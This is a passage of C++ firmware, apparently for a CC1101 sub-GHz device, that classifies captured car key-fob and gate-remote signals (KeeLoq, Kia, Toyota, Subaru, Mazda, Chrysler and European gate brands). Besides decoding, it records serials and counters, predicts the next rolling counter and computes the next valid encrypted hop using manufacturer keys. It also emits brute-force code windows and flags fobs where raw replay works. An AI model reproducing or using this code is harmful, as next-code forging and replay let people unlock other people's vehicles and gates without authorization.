  // KeeLoq: TE 100–750µs covers US 315 MHz fobs (TE≈200µs) and EU 433 MHz fobs (TE≈400µs).
  // Ratio 1.6–2.4 targets the 2:1 KeeLoq encoding and avoids EV1527/PT2262 (ratio≈3).
  bool te_kl  =(cA>=100&&cA<=750&&ratio>=1.6f&&ratio<=2.4f);
  // Region lock: CAME/FAAC/Somfy/Nice/CAME-TWN30/ATA-ELSEMA/Hörmann/Sommer/Beninca/
  // Cardin/V2/DEA/AN-Motors are EU/AU gate brands that ONLY transmit at 433.92/868 MHz.
  // Requiring eu433 stops them claiming North-American vehicle fobs in the ~300–320 MHz
  // band (e.g. a 312.2 MHz Subaru RKE previously mislabeled as LinearDelta3). mhz
  // defaults to 433.92 when the capture frequency is unknown, so these gates stay
  // active unless a real sub-400 MHz frequency is reported. NA-band gate/garage
  // protocols (Security+, PT2262 family, Linear-10, Marantec, EV1527, HT12E) are NOT
  // region-locked — US openers legitimately use 310/315/318/390 MHz.
  bool eu433    =(mhz>=400.f);
  // Toyota Tacoma 2019+ (and related Denso dual-band RKE) transmits on two channels:
  //   Channel A: ~312.0–312.3 MHz   Channel B: ~314.35–315.0 MHz
  // Both share the same rolling-code counter per button press.
  bool toyotaA  =(mhz>=311.5f&&mhz<=313.5f);
  bool toyotaB  =(mhz>=313.8f&&mhz<=315.5f);
  bool toyotaDual=(toyotaA||toyotaB);
  bool te_came=(eu433&&cA>=250&&cA<=450&&ratio>1.6f&&ratio<2.6f);
  // FAAC SLH TE ≈200µs, 2:1 PWM — add ratio guard so random preamble pulses
  // with cA in 150-280µs but wrong ratio don't trip the FAAC decoder.
  bool te_faac=(eu433&&cA>=150&&cA<=280&&ratio>=1.4f&&ratio<=2.8f);
  // Somfy RTS spec TE ≈604µs; tightened from 300-700 to cut overlap with KeeLoq/PWM noise.
  // Somfy-RTS is 433.42 MHz ± ~0.5 MHz only. Gate on frequency to eliminate
  // false positives at 315 MHz where the nibble-XOR checksum still passes by chance.
  bool te_somf=(mhz>=432.0f&&mhz<=434.8f&&cA>=440&&cA<=750&&bLen>=56);
  // Nice FLOR spec TE ≈500µs; window ±16% (420–580µs) to reject car-fob pulse trains
  // that previously caused false Nice-FLOR decodes at 433 MHz (was 340–660µs).
  // !te_kl guard added: KeeLoq fobs at 433 MHz have TE 400–500µs which overlaps the
  // Nice-FLOR TE window; without this guard partial KeeLoq captures fall through to
  // Nice-FLOR after ks_parseKL fails on insufficient bits.
  bool te_nice=(eu433&&!te_kl&&cA>=420&&cA<=580&&bLen>=52);
  // Marantec operates at 433 MHz. Adding eu433 guard removes false positives at 315 MHz.
  bool te_mar =(eu433&&cA>=800&&cA<=1200&&bLen>=16);
  // PT2262 fires when ratio≈3 (1T:3T Princeton tri-state encoding).  Guard out the
  // Toyota dual-band range (311.5–315.5 MHz): PT2262 is a garage/gate chip and
  // never legitimately appears there, but Toyota data bits can fool ks_decodePT2262
  // when the Toyota decoder fails, producing garbage library entries.
  bool te_pt  =(!te_kl&&!toyotaDual&&ratio>2.6f&&ratio<3.6f&&bLen>=24);
  // Linear/Multi-Code is a SHORT fixed 10-bit DIP code. The bLen<=24 cap stops
  // this decoder from acting as a sub-320 MHz catch-all that swallowed real
  // rolling-code fobs (e.g. Toyota-Denso ~40 data bits) which failed their own
  // stricter decoder and fell through to here, getting a confident-but-wrong
  // "Linear-10 / Hyundai/Kia" label. Long frames now fall through to the
  // automotive RKE decoders (Subaru/Mazda/VAG/Hyundai/SantaFe) or to OOK-raw.
  // Linear-10 requires a real burst: minimum ~100 edges (≈3 complete repetitions of
  // the 10-bit code at ~33 edges/rep). Below this it's noise mis-sampled at the CC1101
  // sweep step boundary, not an actual Linear/Nortek remote.
  // v3.20: added !toyotaDual — Linear-10 operates at 303.875 MHz; firing it in the
  // Toyota dual-band range (311.5-315.5 MHz) produced false-positive SN=0xNNN entries
  // for Toyota 2018+ captures (TE≈200 µs, cA≈200 µs) that fell through Toyota decode.
  bool te_lin =(mhz<320.f&&!(toyotaA||toyotaB)&&bLen>=10&&bLen<=24&&cA>=100);
  bool te_ev  =(!te_kl&&cA>=100&&cA<250&&ratio>2.6f&&ratio<3.6f&&bLen>=24);
  bool te_pt24=(!te_kl&&cA>=250&&ratio>2.6f&&ratio<3.6f&&bLen>=20&&bLen<24);
  bool te_ht  =(cA>=100&&cA<=700&&ratio>2.6f&&ratio<3.6f&&bLen>=10&&bLen<=14);
  bool te_ctwn=(eu433&&!te_came&&cA>=300&&cA<=700&&ratio>1.6f&&ratio<2.6f&&bLen>=30&&bLen<50);
  // Ratio guard added v3.16: real ATA/ELSEMA LD3 delta-3 coding has ratio≈2.5;
  // KeeLoq 2:1 PWM has ratio≈2.0. Without this guard a very partial KeeLoq
  // capture (bLen 38-56) could fall through to LD3 after the 66-bit parse fails.
  bool te_ld3 =(eu433&&cA>=300&&cA<=900&&bLen>=38&&bLen<=56&&ratio>=2.2f);
  // Extended protocols
  bool te_horn=(eu433&&!te_came&&cA>=300&&cA<=500&&ratio>1.6f&&ratio<2.4f&&bLen>=30&&bLen<=36);
  bool te_somm=(eu433&&!te_kl&&cA>=250&&cA<=400&&ratio>2.5f&&ratio<3.5f&&bLen>=36&&bLen<=44);
  bool te_beni=(eu433&&!te_kl&&cA>=250&&cA<=500&&ratio>2.5f&&ratio<3.5f&&bLen==26);
  bool te_card=(eu433&&!te_came&&!te_kl&&cA>=380&&cA<=650&&ratio>2.5f&&ratio<3.5f&&bLen>=23&&bLen<=25);
  bool te_v2ph=(eu433&&!te_faac&&cA>=200&&cA<=350&&ratio>1.6f&&ratio<2.5f&&bLen>=60&&bLen<=68);
  bool te_secp=(mhz<320.f&&cA>=380&&cA<=560&&ratio>1.6f&&ratio<2.4f&&bLen>=36&&bLen<=44);
  bool te_dea =(eu433&&cA>=200&&cA<=320&&ratio>1.6f&&ratio<2.5f&&bLen>=38&&bLen<=44);
  bool te_anm =(eu433&&cA>=280&&cA<=440&&ratio>1.6f&&ratio<2.4f&&bLen>=22&&bLen<=26);
  // Gate and garage protocols added in v3.13
  // Nice FLO: TE=700/1400µs fixed code — above Marantec (800-1200µs) and Nice-FLOR (420-580µs)
  bool te_niceflo=(eu433&&cA>=580&&cA<=920&&ratio>=1.5f&&ratio<=2.5f&&bLen>=22);
  // FAAC SLH: TE=255/595µs ratio≈2.33 — tighter than te_faac to avoid overlap
  bool te_faacslh=(eu433&&cA>=220&&cA<=310&&ratio>=2.0f&&ratio<=2.6f&&bLen>=62&&bLen<=66);
  // V2 Phoenix: TE=427/853µs ratio≈2 — guard against CAME-12 overlap via bLen
  bool te_phxv2  =(eu433&&cA>=370&&cA<=500&&ratio>=1.7f&&ratio<=2.3f&&bLen>=50&&bLen<=58);
  // CAME Atomo: Manchester, TE=600/1200µs — distinct from Nice-FLOR (420-580µs)
  bool te_catomf =(eu433&&cA>=500&&cA<=760&&bLen>=60);
  // Security+ 2.0: Manchester, TE=250/500µs — two packets; exclude KeeLoq captures
  bool te_secpv2 =(mhz<450.f&&!te_kl&&cA>=200&&cA<=320&&ratio>=1.5f&&ratio<=2.5f);
  // Automotive RKE protocols — raw-pulse decoders; te_ flags pre-filter obvious mismatches
  bool te_chry=(cA>=200&&cA<=700&&cB>=3000);                                        // Chrysler: short HI + very long LO
  bool te_sub =(cA>=150&&cA<=280&&ratio>2.5f&&ratio<3.5f&&bLen>=46);                // Subaru: 200/600µs PWM, 48-bit
  bool te_maz =(cA>=380&&cA<=520&&ratio>2.5f&&ratio<3.5f&&bLen>=70);                // Mazda Siemens: 450µs const HI
  bool te_vag =(cA>=180&&cA<=330&&ratio>1.8f&&ratio<2.8f&&bLen>=62);                // VAG pre-2004: 250/550µs
  bool te_hkr =(cA>=260&&cA<=400&&ratio>1.8f&&ratio<2.8f&&bLen>=62);                // Hyundai/Kia early: 312/728µs
  bool te_sfe =(cA>=90 &&cA<=165&&ratio>2.5f&&ratio<3.5f&&bLen>=78);                // Santa Fe 2013-16: 125/375µs
  bool te_kv0 =(cA>=150&&cA<=380&&ratio>=1.7f&&ratio<=2.4f&&bLen>=56);              // KIA V0: 250/500µs PWM, 61-bit
  bool te_kv1 =(mhz<320.f&&cA>=350&&cA<=700&&ratio>=1.7f&&ratio<=2.3f&&bLen>=50);  // KIA V1: 500/1000µs Manchester
  // v3.4 FIX: te_toy restricted to Toyota dual-band frequencies (311.5-315.5 MHz).
  // Without a frequency guard, cA≈400µs KeeLoq fobs at 433 MHz satisfied the TE range
  // and caused ks_decodeToyota to run on KeeLoq frames, labelling them as Toyota-Denso.
  // v3.20: lower cA floor from 250 → 150 µs — Toyota 2018+ (GQ4-52T) uses TE≈200 µs;
  // the old 250 µs floor silently excluded those fobs from the km-true Toyota path.
  bool te_toy =((toyotaA||toyotaB)&&cA>=150&&cA<=700);  // upper bound matches ks_decodeToyota 700 µs
  // ── New automotive protocols (v3.59) ─────────────────────────────────────
  // Ford V0: Manchester 80-bit, TE=250/500µs — same TE as te_kv0/te_kv7; GF(2) CRC discriminates
  bool te_frdv0=(cA>=150&&cA<=380&&ratio>=1.4f&&ratio<=2.6f&&bLen>=76);
  // KIA V7: Manchester FM 64-bit, TE=250/500µs, ≥16 preamble pairs, header=0x4C
  bool te_kv7  =(cA>=150&&cA<=380&&ratio>=1.4f&&ratio<=2.6f&&bLen>=60);
  // KIA V2: Manchester 53-bit, TE=500/1000µs, ≥100 preamble pairs, 433 MHz EU
  bool te_kv2  =(eu433&&cA>=350&&cA<=700&&ratio>=1.4f&&ratio<=2.6f&&bLen>=50);
  // KIA V3/V4: 400/800µs PWM, 68-bit, CRC4, KeeLoq with the public OEM key.
  // Band is wider than te_kv0 (150-380) because these are different protocols at
  // different TEs — V0 is 250/500, V3/V4 is 400/800. Overlap with te_kv0 is
  // possible around cA≈380; the Kia decoders are tried in order and each is
  // gated by its own structural/CRC or 12-bit crypto check, so a frame that
  // satisfies both gates can still only commit once.
  bool te_kv34 =(cA>=250&&cA<=550&&ratio>=1.6f&&ratio<=2.4f&&bLen>=60);
  // Subaru V2: Manchester OOK ~987 baud, TE_H≈1013µs — ratio≈2.0 (merged bit-boundary half-symbols)
  bool te_sub2 =(cA>=750&&cA<=1300&&ratio>=1.7f&&ratio<=2.3f&&bLen>=30);
  bool decoded=false;

  // 1. KeeLoq — cryptographically-gated classification.
  //
  // ROOT-CAUSE FIX for "same fob, different result every press": the old code
  // only ATTEMPTED a KeeLoq decode when strict te_kl timing passed. A real
  // KeeLoq fob with marginal/noisy timing (partial capture, RSSI jitter) would
  // fail te_kl, never be tried, and fall through to the timing-overlapping
  // heuristic decoders (CAME-12 / FAAC-64 / Nice-FLOR / Marantec / PT2262) —
  // which then disagree press-to-press.
  //
  // v2.6 attempted a two-tier fix (loose attempt / strict commit) but still
  // flipped for unknown-key fobs: if pr.found==false and te_kl==false (loose
  // timing only), the frame fell through even though 66 valid bits were parsed.
  //
  // v2.7 fix — the REAL discriminator is the parse, not the timing gate:
  //   • ks_parseKL requires ≥66 extracted bits AND hop!=0 AND btn!=0.
  //   • No overlapping protocol can pass this: CAME-12 is 12 bits, FAAC-64 is
  //     64 bits (2 short of 66), Nice-FLOR is 52 bits, PT2262 is 24 bits.
  //   • If klOK==true, the frame IS KeeLoq. Commit unconditionally.
  //   • confidence = "crypto-confirmed" when a manufacturer key validates the
  //     discrimination bits; "structural" otherwise.
  //
  // v2.8 fix — "real KeeLoq still flips to FAAC/CAME/Nice on some presses":
  // ks_klPwm extracts bits using a single TE estimate (the k-means short
  // centroid cA). On a noisy/partial capture the centroid is skewed, klPwm
  // under-extracts (<66 bits), the parse fails, and the genuine KeeLoq frame
  // falls through to a timing-overlapping decoder. Fix is twofold:
  //   1. Widen the loose ATTEMPT window so marginal frames still reach the
  //      parse (cA 70–1000, ratio 1.3–2.9).
  //   2. Retry extraction with several TE candidates (measured centroid, half
  //      the long centroid, canonical US-315/EU-433 TE, and their midpoint).
  // The 66-bit / hop!=0 / btn!=0 parse stays the ONLY commit gate, so these
  // extra attempts can only recover real KeeLoq frames — a non-KeeLoq frame
  // still cannot fabricate a valid 66-bit structure.
  bool te_kl_loose = (cA>=70&&cA<=1000&&ratio>=1.3f&&ratio<=2.9f);
  // v3.4 FIX — leader-code KeeLoq gate: HCS200/HCS201/clone chips use a single long start
  // pulse (typically 8-12×TE, usually 1.6-5 ms for EU/NA fobs) instead of an alternating
  // preamble.  This long pulse falls below the 5000 µs k-means exclusion filter, so it
  // skews cB high and pushes ratio well above the te_kl_loose ceiling (2.9).  Without this
  // gate the KeeLoq block is never entered and the frame falls through to gate decoders.
  // ks_klPwm's leader-code fallback handles the actual extraction; the canonical TE
  // candidate (200 for 315 MHz, 400 for 433 MHz) produces correct bit timings even when
  // cA is biased by the leader-code outlier.
  bool te_kl_leader=(!te_kl&&!te_kl_loose&&cA>=100&&cA<=750&&ratio>=3.0f);
  // v3.46 FIX — Toyota Ch-A false-positive gate.
  // ks_klPwm can extract 66+ bits from a long Toyota Denso capture: the preamble
  // is all 1T HI + 1T LO pairs, so every pulse decodes as a '0' bit, and a 200-pulse
  // capture yields 100+ PWM bits.  ks_parseKL then passes because hop≠0 (preamble
  // pairs contribute some non-zero bits from the data section) and btn≠0.  The result
  // is a "KeeLoq" signal at 312.2 MHz with systematically sparse hop bit density
  // (2-9 bits set out of 32 vs the expected ~16 for a genuinely random 32-bit cipher
  // output), confirming the hop is NOT real KeeLoq encrypted data.
  // Fix: when the capture frequency is Toyota Ch-A (310-313 MHz) AND the Toyota TE
  // gate also passes, skip the KeeLoq block entirely — those signals are Toyota-Denso
  // and will decode correctly at step 1b below.  Real KeeLoq at 315 MHz / 433 MHz
  // is completely unaffected.
  //
  // v3.47 FIX — 2FSK capture mode guard.
  // KeeLoq is a pure OOK (PWM) protocol.  When the CC1101 is in 2FSK edge-capture
  // mode the GDO0 pin outputs the FSK demodulator's NRZ bit stream, not OOK edges.
  // ks_klPwm applied to this NRZ stream occasionally finds a run of bits that
  // satisfies the 66-bit structural check purely by chance, producing a KeeLoq
  // false positive with a random serial number (different every press — the clearest
  // sign of a false positive).  Evidence from Ford EU 433.92 MHz in 2FSK mode:
  // 6 signals captured, 2 decoded as "KeeLoq" with serials 22529 and 8193 (different
  // fob presses should always share the same serial — they did not), while the other
  // 4 captured correctly as OOK-raw.  Fix: gate the entire KeeLoq block out whenever
  // fskCapMode is true — no real KeeLoq fob can appear in a 2FSK capture.
  //
  // v3.48 FIX — Toyota Ch-B (315 MHz) KeeLoq false-positive gate.
  // Identical mechanism to the v3.46 Ch-A fix but at 314–315 MHz.  ks_klPwm
  // extracts 66+ bits from long Toyota-Denso Ch-B captures (bLen 161–280) and
  // ks_parseKL passes by structural chance.  Proof: Lexus LS300 at 314.65 MHz
  // produced three KeeLoq decodes with serials 28670, 324, and 32961 from a
  // single fob in one session — one fob always has one fixed serial, so all
  // three are false positives.  Discriminant: real KeeLoq frames at 315 MHz are
  // 66–130 bits (preamble + 66-bit data body); Toyota-Denso false positives are
  // 161–280 bits.  Gate: skip KeeLoq when Ch-B + te_toy + bLen > 160.
  // Real KeeLoq at 315 MHz with bLen ≤ 160 is completely unaffected.
  // ─── KIA V3/V4 — must run BEFORE the generic KeeLoq path ────────────────────
  // Ordering matters and is not cosmetic. The generic KeeLoq block below commits
  // unconditionally as soon as ks_parseKL succeeds (see the v2.7 rationale). A Kia
  // V3/V4 frame can satisfy that 66-bit structural check by chance, and if it did
  // the frame would be consumed and mislabelled before the Kia decoder ran. Kia
  // V3/V4 is a specific KeeLoq variant, so it gets first refusal: this decoder
  // needs the 12-bit crypto check to fire, which the generic path does not.
  //
  // Gate: te_kv34 (400/800 µs PWM). Independent of te_kl: a Kia frame at
  // cA≈400/ratio≈2.0 satisfies both, and the specific check wins.
  if(!decoded && te_kv34){
    KiaV34Frame kv;
    if(ks_decodeKiaV34(buf,cnt,kv)){
      decoded=true;
      doc["proto"] = kv.v3 ? "KIA-V3" : "KIA-V4";
      char fh[12]; snprintf(fh,12,"0x%08lX",(unsigned long)kv.serial);
      doc["sn"]=fh;
      doc["btn"]=kv.btn;
      doc["ctr"]=kv.ctr;
      char eh[12]; snprintf(eh,12,"0x%08lX",(unsigned long)kv.encrypted);
      doc["hop"]=eh;
      doc["crc4"]=kv.crc;            // extracted and shown; not validated (see header)
      doc["mfr"]="Kia/Hyundai";
      // Version is derived from which interpretation validated, not from the
      // preamble: a width-only capture cannot see the leading level that the
      // reference uses for is_v3_sync. Flag it as an inference, not a reading.
      doc["version_inferred"]=true;
      // Reporting rule (doc 06 §3.2): the 12-bit check is strong (1/4096) but the
      // candidate space is a single fixed key, so a lone frame is never called
      // crypto-confirmed. One frame is a candidate; agreement across two presses
      // is what promotes it — same contract as the HCS path, and the same gate,
      // so a single frame is reported identically on both paths.
      //
      // Note the hop passed to the gate is the *encrypted* word: it is what
      // distinguishes two presses.
      bool agree = ks_kiaV34Confirm(kv.serial, kv.encrypted);
      doc["confirmed"]=agree;
      doc["candidate"]=!agree;
      doc["confidence"]=agree?"crypto-confirmed":"unconfirmed";
      HistEntry he={kv.serial, kv.encrypted, (uint32_t)kv.ctr, 34, mhz, nowMs};
      ks_hPush(he);
      int32_t d=ks_estDelta(kv.serial,34,(uint32_t)kv.ctr);
      JsonObject p=doc["predict"].to<JsonObject>();
      p["delta"]=d;
      p["next_ctr"]=(uint32_t)((kv.ctr+(uint16_t)d)&0xFFFF);
      p["window"]=65536;
      p["key_found"]=true;
      p["key_pattern"]="Kia_V3_V4_OEM";
      // Next-code prediction uses the KIA plaintext layout, which is NOT the HCS
      // layout ks_klBuildPlain() produces: Kia carries the full 28-bit serial in
      // bits [27:0] with no discriminator field.
      { uint32_t pt=ks_kiaV34BuildPlain(kv.btn,kv.serial,(uint16_t)(kv.ctr+(uint16_t)d));
        uint32_t nh=ks_klEncrypt(pt,ks_unmaskMfrKey(KIA_V34_MF_KEY));
        char nhh[12]; snprintf(nhh,12,"0x%08lX",(unsigned long)nh);
        p["next_hop"]=nhh; }
      p["note"]=kv.v3 ? "Kia V3 68-bit PWM, KeeLoq with the public OEM key (version inferred)"
                      : "Kia V4 68-bit PWM, KeeLoq with the public OEM key (version inferred)";
    }
  }

  bool te_kl_skip = (toyotaA && te_toy) || fskCapMode || (toyotaB && te_toy && bLen > 160);
  if((te_kl || te_kl_loose || te_kl_leader) && !te_kl_skip){
    KLFrame f; bool klOK=false;
    static char klb[CAP_SZ/2+1];
    uint32_t teCand[4]; uint8_t nTe=0;
    teCand[nTe++]=cA;                                   // measured short centroid
    if(cB>0) teCand[nTe++]=cB>>1;                       // half the long centroid (2T → T)
    teCand[nTe++]=(mhz<320.f)?200:400;                  // canonical US-315 / EU-433 TE
    teCand[nTe++]=(cA+((mhz<320.f)?200:400))>>1;        // midpoint of measured & nominal
    for(uint8_t t=0;t<nTe&&!klOK;t++){
      if(teCand[t]<60||teCand[t]>1000) continue;
      uint16_t klLen=ks_klPwm(buf,cnt,teCand[t],klb);
      if(klLen>=66&&ks_parseKL(klb,klLen,f)){ klOK=true; break; }
      if(klLen>=66){static char klm[CAP_SZ/4+1]; uint16_t ml=ks_manchester(klb,klLen,klm); if(ml>=66&&ks_parseKL(klm,ml,f)){ klOK=true; break; }}
    }
    if(klOK){
      // ── HCS101 structural check ──────────────────────────────────────────────
      // Microchip HCS101 is a simple fixed-code (non-rolling) transmitter.
      // Structural fingerprint (KeeLoq structural check): the lower 12 bits of the
      // "hop" word are 0x000, and the button nibble (bits 15:12 of hop) matches
      // the button field in the fix word.  Counter is hop>>16 (16 bits, repeating).
      // predict.window=0: same frame is transmitted every press — raw replay works.
      if((f.hop & 0xFFFU) == 0x000U && f.btn == ((f.hop >> 12) & 0xFU)){
        decoded=true;
        doc["proto"]="HCS101-Fixed"; doc["sn"]=f.sn;
        char sh[12]; snprintf(sh,12,"0x%08lX",(unsigned long)f.hop);
        doc["hop"]=sh; doc["btn"]=f.btn;
        uint16_t hcs101Ctr=(uint16_t)(f.hop>>16);
        doc["ctr"]=hcs101Ctr; doc["rawCtr"]=hcs101Ctr;
        doc["confirmed"]=false; doc["confidence"]="structural";
        doc["mfr"]="Microchip HCS101";
        HistEntry he={f.sn,f.hop,(uint32_t)hcs101Ctr,0,mhz,nowMs}; ks_hPush(he);
        ks_klRecentPush(f);
        JsonObject p=doc["predict"].to<JsonObject>();
        p["window"]=0;
        p["key_found"]=false;
        p["note"]="HCS101 fixed replay — transmits the same frame on every press; raw replay works unconditionally";
      } else {
      // ── Normal KeeLoq rolling-code path ──────────────────────────────────────
      KLPred pr=ks_klPredict(f,nowMs);
      // Parse success IS the commit gate — always commit when klOK.
      decoded=true;
      doc["proto"]="KeeLoq"; doc["sn"]=f.sn;
      // V1: three states, not two.
      //   found            → the same key matched two consecutive frames
      //   candidate        → one frame matched; ask for another press
      //   neither          → no key match at all (structural decode only)
      doc["confirmed"]=pr.found;
      doc["candidate"]=pr.candidate;
      doc["confidence"]=pr.found ? (pr.pattern?"pattern-match":"crypto-confirmed")
                                 : (pr.candidate?"unconfirmed":"structural");
      char sh[12]; snprintf(sh,12,"0x%08lX",(unsigned long)f.hop);
      doc["hop"]=sh; doc["btn"]=f.btn; doc["rawCtr"]=f.rawCtr; doc["ctr"]=f.rawCtr;
      HistEntry he={f.sn,f.hop,(uint32_t)f.rawCtr,0,mhz,nowMs}; ks_hPush(he);
      ks_krPush(f);
      ks_klRecentPush(f);
      doc["mfr"]=(pr.found||pr.candidate)?pr.kname:"HCS-series (unknown mfr key)";
      doc["pattern"]=pr.pattern;
      doc["learn"]=ks_klLearnName(pr.learn);
      JsonObject p=doc["predict"].to<JsonObject>();
      p["delta"]=pr.delta; p["next_ctr"]=pr.nextCtr; p["key_found"]=pr.found; p["lin_est"]=String(pr.linEst,2);
      if(pr.found){char nh[12];snprintf(nh,12,"0x%08lX",(unsigned long)pr.nextHop);p["next_hop"]=nh;p["key_pattern"]=pr.kname;}
      else if(pr.candidate) p["note"]="one frame matched "+String(pr.kname)+" — press the fob again on the same button to confirm";
      else p["note"]="no manufacturer key match — structural decode only";
      p["window"]=65536;
      if(pr.bwValid){
        JsonArray bwTop=doc["bw"].to<JsonArray>();
        JsonArray bwN=p["brute_window"].to<JsonArray>();
        for(uint8_t i=0;i<10;i++){
          char bh[12];
          if(pr.found) snprintf(bh,12,"0x%08lX",(unsigned long)pr.bw[i]);
          else         snprintf(bh,12,"0x%04lX",(unsigned long)pr.bw[i]);
          bwN.add(bh); bwTop.add(pr.bw[i]);
        }
        doc["bwValid"]=true;
      }
      } // end normal KeeLoq path
    }
  }
  // 1b. Toyota/Denso — runs before LinearDelta3 (#13) to prevent preamble-artefact false positives.
  // Preamble-based TE measurement makes this immune to k-means ratio corruption at 433 MHz.
  // Dual-band soft-ID: if the full PWM decode fails but freq is in the Toyota dual-band range
  // (Channel A ~312 MHz / Channel B ~314-315 MHz), commit as Toyota-Denso-raw rather than
  // falling through to the Manchester fallback and generating a PT2262-Manchester false positive.
  // too_short fast-exit: if cnt<80 the decoder loop (pi+79<cnt) never executes — mark early
  // so the signal isn't wastefully run through all 25+ decoders below only to reach soft-ID.
  // ratio≤2.5 guard (v3.54): Toyota 1T/2T PWM → ratio≈1.0–2.2; RSSI lag ≤2.5 at most.
  // Signals with ratio>2.5 at 315 MHz are NOT Toyota (e.g. large-TE OOK fobs with
  // ratio=3–5) and must not be short-circuited as Toyota before KeeLoq/other decoders run.
  if(!decoded&&te_toy&&cnt<60&&ratio<=2.5f){
    decoded=true;
    const char* tch=toyotaA?"A":toyotaB?"B":"";
    doc["proto"]="Toyota-Denso"; doc["mfr"]="Toyota/Lexus (Denso)";
    doc["sn"]="0x000000";doc["btn"]=0;doc["ctr"]=0;doc["ck_ok"]=false;
    if(tch[0]) doc["channel"]=tch;
    doc["confirmed"]=false;doc["confidence"]="too_short";
    JsonObject p=doc["predict"].to<JsonObject>();
    p["window"]=0;
    p["note"]="Toyota/Denso — only "+String(cnt)+" edges captured (need 60+); press fob closer or hold longer";
  }
  // Ratio floor (3.5), replacing the ratio<=2.5 ceiling that used to sit here (and the
  // ratio<=3.0 ceiling still used by the Ch-B soft-ID below).
  //
  // The ceilings were inverted. A Toyota capture that actually contains data measures a
  // HIGH k-means ratio -- 6.6 to 13.2 across the corpus -- because the data region mixes
  // 1T and 2T HI pulses with long inter-bit LO gaps, while the equal-width preamble
  // collapses toward 1.0. Every non-Toyota file this decoder fires on measures ~2.0
  // (2.01-4.62), and 53 of the 62 Toyota/Lexus captures measure above 3.0. So the old
  // ceiling admitted the aliased population and excluded the brand it serves: the decoder
  // was never called on ANY of its own 62 captures, while firing on 12 foreign files.
  // A floor at 3.5 separates the two measured populations.
  if(!decoded&&te_toy&&ratio>=3.5f){
    uint32_t tsn=0;uint8_t tbtn=0;uint16_t tctr=0;
    const char* tch=toyotaA?"A":toyotaB?"B":"";
    if(ks_decodeToyota(buf,cnt,tsn,tbtn,tctr)){
      decoded=true;
      doc["proto"]="Toyota-Denso";
      char fh[10];snprintf(fh,10,"0x%06lX",(unsigned long)tsn);
      doc["sn"]=fh;doc["btn"]=tbtn;doc["ctr"]=tctr;
      doc["mfr"]="Toyota/Lexus (Denso)";
      if(tch[0]) doc["channel"]=tch;
      HistEntry he={tsn,0,(uint32_t)tctr,28,mhz,nowMs};ks_hPush(he);
      int32_t d=ks_estDelta(tsn,28,(uint32_t)tctr);
      JsonObject p=doc["predict"].to<JsonObject>();
      p["delta"]=d;p["next_ctr"]=(uint16_t)((tctr+(uint16_t)d)&0xFFFU);
      p["window"]=4096;p["note"]="Toyota/Denso proprietary rolling code — cipher not public";
    }
  }
  // ─── VEHICLE KEY-FOB RKE DECODERS (priority) ─────────────────────────────────
  // Most captured signals are vehicle key fobs, so EVERY automotive rolling-code
  // protocol is checked BEFORE any gate/garage-door opener (CAME, FAAC, Somfy,
  // Nice, Marantec, PT2262, Linear-10, EV1527, …). Each raw-pulse decoder below
  // requires a multi-millisecond sync gap + exact PWM bit timing + full bit count
  // (and reports a checksum), so a gate-remote pulse train cannot trip it. Only
  // after all vehicle protocols fail do the gate/garage decoders get a turn.
  // 1c. Chrysler / Dodge / Jeep (2004-2010) — 80-bit OOK PWM, nibble-interleaved rolling
  if(!decoded&&te_chry){uint8_t cr[10];bool vk=false;if(ks_decodeChrysler(buf,cnt,cr,vk)){decoded=true;doc["proto"]="Chrysler";char fh[24];snprintf(fh,24,"%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X",cr[0],cr[1],cr[2],cr[3],cr[4],cr[5],cr[6],cr[7],cr[8],cr[9]);doc["frame"]=fh;doc["byte0"]=cr[0];doc["ck_ok"]=vk;doc["mfr"]="Dodge/Jeep/Chrysler";uint32_t sn=((uint32_t)cr[1]<<8)|cr[2];HistEntry he={sn,0,(uint32_t)cr[0],21,mhz,nowMs};ks_hPush(he);JsonObject p=doc["predict"].to<JsonObject>();p["window"]=256;p["note"]="Chrysler 4-bit counter + 8-bit nibble-interleaved rolling";}}
  // 1d. Subaru legacy RKE (~2000-2010) — 48-bit LSB-first PWM, nibble checksum
  if(!decoded&&te_sub){uint32_t fid=0;uint8_t sc=0,sb=0;bool sv=false;if(ks_decodeSubaru(buf,cnt,fid,sc,sb,sv)){decoded=true;doc["proto"]="Subaru-RKE";char fh[12];snprintf(fh,12,"0x%08lX",(unsigned long)fid);doc["sn"]=fh;doc["ctr"]=sc;doc["btn"]=sb;doc["ck_ok"]=sv;doc["mfr"]="Subaru";HistEntry he={fid,0,(uint32_t)sc,22,mhz,nowMs};ks_hPush(he);int32_t d=ks_estDelta(fid,22,(uint32_t)sc);JsonObject p=doc["predict"].to<JsonObject>();p["delta"]=d;p["next_ctr"]=(uint32_t)((sc+d)&0xFF);p["window"]=256;p["note"]="Subaru Impreza/Forester/Legacy 8-bit rolling";}}
  // 1e. Mazda Siemens VDO (~2003-2009) — 72-bit, Siemens proprietary hop + nibble checksum
  if(!decoded&&te_maz){uint32_t mhp=0,msr=0;uint8_t mc2=0,mb3=0;bool mv=false;if(ks_decodeMazda(buf,cnt,mhp,msr,mc2,mb3,mv)){decoded=true;doc["proto"]="Mazda-Siemens";char fh[10];snprintf(fh,10,"0x%06lX",(unsigned long)msr);doc["sn"]=fh;char hh[12];snprintf(hh,12,"0x%08lX",(unsigned long)mhp);doc["hop"]=hh;doc["ctr"]=mc2;doc["btn"]=mb3;doc["ck_ok"]=mv;doc["mfr"]="Mazda (Siemens VDO)";HistEntry he={msr,mhp,(uint32_t)mc2,23,mhz,nowMs};ks_hPush(he);int32_t d=ks_estDelta(msr,23,(uint32_t)mc2);JsonObject p=doc["predict"].to<JsonObject>();p["delta"]=d;p["next_ctr"]=(uint32_t)((mc2+d)&0xFF);p["window"]=256;p["note"]="Mazda3/6/CX-7 2003-2009 Siemens rolling";}}
  // 1f. VAG pre-2004 (VW/Audi/Seat/Skoda) — 64-bit MSB-first, 16-bit rolling, inverted-sum checksum
